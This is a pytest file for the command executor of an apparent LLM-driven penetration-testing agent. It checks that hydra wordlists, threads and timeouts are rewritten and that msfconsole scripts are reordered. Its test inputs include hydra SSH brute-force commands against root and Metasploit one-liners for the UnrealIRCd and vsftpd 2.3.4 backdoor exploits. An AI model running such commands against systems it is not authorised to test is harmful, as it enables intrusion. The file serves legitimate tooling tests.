"""P6.1 单测: hydra 字典治理 + 并发/超时调整.

防止 LLM 一拍脑袋选 rockyou.txt 造成 R8 那种 99 天 ETA 的事故.
"""
from __future__ import annotations

import os
import shlex

import pytest

from app.services.pentest_agent.executor import Executor


@pytest.fixture
def executor():
    return Executor()


# ═════════════════════════════════════════════════════════════
# _rewrite_hydra_wordlist_arg: 黑名单 + 文件不存在降级
# ═════════════════════════════════════════════════════════════
class TestHydraWordlistRewrite:
    def test_rockyou_explicitly_blocked_even_if_exists(self, executor, monkeypatch, tmp_path):
        # 故意造一个"存在的 rockyou.txt", 验证黑名单优先于"文件存在"判定
        fake_rockyou = tmp_path / "rockyou.txt"
        fake_rockyou.write_text("password\n123456\n")
        rockyou_posix = fake_rockyou.as_posix()  # Windows 反斜杠会被 shlex 当转义符

        fallback = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        # 直接 monkeypatch _pick_hydra_fallback_wordlist 避免依赖 Kali 实际文件
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: fallback)

        args = f"-l root -P {rockyou_posix} 192.168.1.1 ssh"
        new_args, note = executor._rewrite_hydra_wordlist_arg(args)
        assert fallback in new_args
        assert "rockyou" not in new_args
        assert "黑名单" in note
        assert "99 天" in note

    def test_rockyou_gz_blocked(self, executor, monkeypatch):
        fallback = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: fallback)
        args = "-l root -P /usr/share/wordlists/rockyou.txt.gz target ssh"
        new_args, note = executor._rewrite_hydra_wordlist_arg(args)
        assert fallback in new_args
        assert "黑名单" in note

    def test_normal_wordlist_passes_through(self, executor, monkeypatch, tmp_path):
        normal = tmp_path / "small.txt"
        normal.write_text("a\nb\n")
        normal_posix = normal.as_posix()
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: "/some/fallback")
        args = f"-l root -P {normal_posix} target ssh"
        new_args, note = executor._rewrite_hydra_wordlist_arg(args)
        # 文件存在 + 不在黑名单 -> 不动
        assert new_args == args
        assert note == ""

    def test_missing_wordlist_falls_back(self, executor, monkeypatch):
        fallback = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: fallback)
        args = "-l root -P /nonexistent/path.txt target ssh"
        new_args, note = executor._rewrite_hydra_wordlist_arg(args)
        assert fallback in new_args
        assert "不存在" in note


# ═════════════════════════════════════════════════════════════
# _pick_hydra_fallback_wordlist: unix_passwords.txt 优先
# ═════════════════════════════════════════════════════════════
class TestFallbackPriority:
    def test_unix_passwords_is_first_candidate(self, executor, monkeypatch):
        # 模拟所有候选都存在, 应该选第一个 (unix_passwords.txt)
        monkeypatch.setattr(os.path, "isfile", lambda p: True)
        chosen = executor._pick_hydra_fallback_wordlist()
        assert chosen == "/usr/share/wordlists/metasploit/unix_passwords.txt"

    def test_falls_to_seclists_top1000_if_no_unix(self, executor, monkeypatch):
        seclists = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
        def isfile(p):
            return p == seclists
        monkeypatch.setattr(os.path, "isfile", isfile)
        assert executor._pick_hydra_fallback_wordlist() == seclists

    def test_falls_to_john_if_no_metasploit_no_seclists(self, executor, monkeypatch):
        john = "/usr/share/john/password.lst"
        def isfile(p):
            return p == john
        monkeypatch.setattr(os.path, "isfile", isfile)
        assert executor._pick_hydra_fallback_wordlist() == john

    def test_returns_empty_when_no_candidates_exist(self, executor, monkeypatch):
        monkeypatch.setattr(os.path, "isfile", lambda p: False)
        assert executor._pick_hydra_fallback_wordlist() == ""


# ═════════════════════════════════════════════════════════════
# _rewrite_hydra_runtime_safety: -t 16, -w 5, 大字典降级 5MB 阈值
# ═════════════════════════════════════════════════════════════
class TestHydraRuntimeSafety:
    def test_threads_capped_at_16(self, executor):
        # 用户提交 -t 64, 应该被砍到 16
        new_args, notes = executor._rewrite_hydra_runtime_safety("-l root -P x -t 64 target ssh")
        parts = shlex.split(new_args)
        t_idx = parts.index("-t")
        assert parts[t_idx + 1] == "16"
        assert any("-t 16" in n for n in notes)

    def test_threads_default_16(self, executor):
        new_args, notes = executor._rewrite_hydra_runtime_safety("-l root -P x target ssh")
        parts = shlex.split(new_args)
        assert "-t" in parts
        t_idx = parts.index("-t")
        assert parts[t_idx + 1] == "16"

    def test_threads_below_16_unchanged(self, executor):
        # 用户故意用 -t 4 (谨慎模式), 不应被改大
        new_args, notes = executor._rewrite_hydra_runtime_safety("-l root -P x -t 4 target ssh")
        parts = shlex.split(new_args)
        t_idx = parts.index("-t")
        assert parts[t_idx + 1] == "4"

    def test_f_flag_auto_added(self, executor):
        new_args, notes = executor._rewrite_hydra_runtime_safety("-l root -P x target ssh")
        assert "-f" in shlex.split(new_args)
        assert any("`-f`" in n for n in notes)

    def test_large_wordlist_downgraded_at_5mb(self, executor, monkeypatch, tmp_path):
        big = tmp_path / "big.txt"
        big.write_bytes(b"x" * (6 * 1024 * 1024))  # 6 MB
        big_posix = big.as_posix()

        fallback = tmp_path / "small.txt"
        fallback.write_text("a\nb\n")
        fallback_posix = fallback.as_posix()
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: fallback_posix)

        new_args, notes = executor._rewrite_hydra_runtime_safety(
            f"-l root -P {big_posix} target ssh"
        )
        assert fallback_posix in new_args
        assert any("体积约" in n for n in notes)

    def test_small_wordlist_not_touched(self, executor, monkeypatch, tmp_path):
        small = tmp_path / "small.txt"
        small.write_text("a\nb\n")
        small_posix = small.as_posix()
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: "/nonexistent")
        new_args, notes = executor._rewrite_hydra_runtime_safety(
            f"-l root -P {small_posix} target ssh"
        )
        assert small_posix in new_args
        # 不应该有体积告警
        assert not any("体积" in n for n in notes)


# ═════════════════════════════════════════════════════════════
# tools.toml: hydra description + timeout 配置生效
# ═════════════════════════════════════════════════════════════
class TestHydraToolConfig:
    def test_hydra_timeout_is_1200(self, executor):
        cfg = executor.tools.get("hydra")
        assert cfg is not None
        assert cfg.get("timeout") == 1200

    def test_hydra_description_warns_about_rockyou(self, executor):
        cfg = executor.tools.get("hydra")
        desc = str(cfg.get("description", ""))
        assert "rockyou" in desc.lower()
        assert "unix_passwords" in desc

    def test_medusa_registered(self, executor):
        cfg = executor.tools.get("medusa")
        assert cfg is not None
        assert cfg.get("timeout") == 1200


# ═════════════════════════════════════════════════════════════
# _cap_long_task_timeout: hydra cap = 1200
# ═════════════════════════════════════════════════════════════
class TestHydraTimeoutCap:
    def test_hydra_cap_is_1200(self, executor):
        cfg = {"timeout": 9999, "command": "hydra {args}"}
        new_cfg, note = executor._cap_long_task_timeout("hydra", cfg, "")
        assert new_cfg["timeout"] == 1200
        assert "1200" in (note or "")

    def test_short_timeout_not_inflated(self, executor):
        # 如果用户故意设小 timeout, cap 不应该把它放大
        cfg = {"timeout": 300, "command": "hydra {args}"}
        new_cfg, note = executor._cap_long_task_timeout("hydra", cfg, "")
        assert new_cfg["timeout"] == 300


# ═════════════════════════════════════════════════════════════
# 端到端: Executor.run 集成 P6.1 (dry-run)
# ═════════════════════════════════════════════════════════════
class TestHydraEndToEnd:
    def test_full_chain_rockyou_to_unix_passwords(self, executor, monkeypatch):
        fallback = "/usr/share/wordlists/metasploit/unix_passwords.txt"
        monkeypatch.setattr(executor, "_pick_hydra_fallback_wordlist", lambda: fallback)
        # 模拟 hydra 二进制存在
        monkeypatch.setattr(executor, "_ensure_tool_probe",
                            lambda name, cfg, refresh=False: {"available": True, "missing_requires": [], "version": "hydra v9"})

        result = executor.run(
            "hydra",
            "-l root -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -t 4",
            dry_run=True,
        )
        cmd = result.get("command", "")
        assert "rockyou" not in cmd
        assert fallback in cmd
        notes = result.get("compatibility_notes", [])
        joined = " | ".join(notes)
        assert "黑名单" in joined or "rockyou" in joined.lower()


# ═════════════════════════════════════════════════════════════
# P14: msfconsole safety rewrite must not append payload after an early exit
# ═════════════════════════════════════════════════════════════
class TestMsfconsoleSafetyRewrite:
    def test_existing_run_exit_is_reordered_after_payload_and_lport(self, executor):
        args = "-q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.1.10; set RPORT 6667; set LHOST 192.168.1.2; run; exit'"
        new_args, notes = executor._rewrite_msfconsole_args(args)

        script = shlex.split(new_args)[2]
        assert "; run" not in script.lower()
        assert "set LPORT" in script
        assert "set payload" in script
        assert script.lower().endswith("exit -y")
        assert script.lower().count("exit") == 1
        lowered = script.lower()
        exploit_idx = lowered.rindex("; exploit")
        assert lowered.index("set lport") < exploit_idx < lowered.index("exit -y")
        assert any("中间 `exit`" in n for n in notes)

    def test_existing_exploit_exit_is_reordered_after_payload_and_lport(self, executor):
        args = "-q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; set RPORT 21; exploit; exit'"
        new_args, _notes = executor._rewrite_msfconsole_args(args)

        script = shlex.split(new_args)[2]
        assert "set LPORT" in script
        assert "set payload" in script
        assert script.lower().endswith("exit -y")
        assert script.lower().count("exit") == 1
        lowered = script.lower()
        exploit_idx = lowered.rindex("; exploit")
        assert lowered.index("set payload") < exploit_idx < lowered.index("exit -y")
